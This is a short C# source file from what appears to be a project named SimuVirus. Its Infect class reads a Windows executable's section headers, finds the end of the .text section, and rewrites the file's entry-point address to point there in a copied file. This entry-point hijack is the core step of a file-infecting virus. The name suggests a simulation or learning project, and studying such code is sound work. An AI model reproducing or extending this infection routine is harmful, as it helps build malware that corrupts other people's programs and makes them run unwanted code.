using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Windows.Input;
using SimuVirus.tools;
using System.IO;

namespace SimuVirus.deploy
{
    class Infect
    {
        public void infectPe(string filePath)
        {
            ulong textStart=0;
            ulong textEnd=0;
            ulong EntryPoint=0;

            PEreader peReader = new PEreader();
            peReader.initialize(filePath);
            for (int headerNo = 1; headerNo < peReader.imageSectionHeaders.Length; ++headerNo)
            {
                string name = new string(peReader.imageSectionHeaders[headerNo - 1].Name);
                if (name.Equals(".text\0\0\0"))
                {
                    textStart = peReader.imageBase + peReader.imageSectionHeaders[headerNo - 1].VirtualAddress;
                    EntryPoint = peReader.imageBase + peReader.addressOfEntryPoint;
                    textEnd = peReader.imageBase + peReader.imageSectionHeaders[headerNo].VirtualAddress;
                    break;
                }
            }

            uint newOep = (uint)(textEnd - peReader.imageBase);
            int addr = peReader.dosHeader.e_lfanew + sizeof(UInt32) + Marshal.SizeOf(peReader.fileHeader) + 0x10;
            FileStream newFile = peReader.launchNewFile();
            peReader.copyStreamFromSrc(newFile);
            peReader.modifyStream(newFile, addr, BitConverter.GetBytes(newOep));
            peReader.close(newFile);
        }
    }
}
